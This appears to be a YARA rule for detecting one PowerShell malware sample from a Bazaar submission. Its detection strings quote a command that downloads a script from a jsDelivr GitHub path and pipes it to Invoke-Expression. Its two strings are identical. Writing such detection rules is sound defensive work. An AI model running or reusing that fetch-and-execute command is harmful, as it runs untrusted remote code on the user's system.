rule SCRIPT_Sample_Unique_80fea95c {
    meta:
        description = "Specimen unique (soumission Bazaar) - strings distinctifs propres au sample"
        author      = "Marjoriefort"
        date        = "2026-09-18"
        reference   = "80fea95c4fc1c15e87db87bc141076b7c8b33322f7d61b9c9b8908a99d3480ab.ps1"
        confidence  = "low"
        note        = "Regle specimen : vise la re-soumission identique. Verifier en sandbox."
        yarahub_uuid              = "aacb8ee8-9a1a-4ab3-969c-fe9f96716d43"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "ff13c473d0a91a6a11b8610a5dfbc3f0"
        yarahub_reference_link    = "https://github.com/Marjoriefort/yara-rules"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
    strings:
        $a = "irm cdn.jsdelivr.net/gh/19875567137/FCCC8F-62-3C-61D48-4E/80-7314 | iex" ascii wide
        $b = "irm cdn.jsdelivr.net/gh/19875567137/FCCC8F-62-3C-61D48-4E/80-7314 | iex" ascii wide
    condition:
        all of them
}
